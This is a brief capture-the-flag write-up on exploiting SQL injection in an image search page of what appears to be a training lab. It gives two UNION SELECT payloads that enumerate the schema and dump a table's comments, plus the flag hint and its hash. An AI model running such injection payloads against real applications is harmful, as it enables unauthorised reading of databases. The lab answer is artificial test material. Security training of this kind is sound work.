# How I found it

There is Injection sql In Search Image page so i use this query to get all tables

`1 UNION SELECT table_name, column_name FROM information_schema.columns`

i found a table call list_images i get all informations in this table and i found the flag in the id : 5 by

`1 UNION SELECT id, comment FROM list_images`

### Result

ID: 1 UNION SELECT id, comment FROM list_images
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5
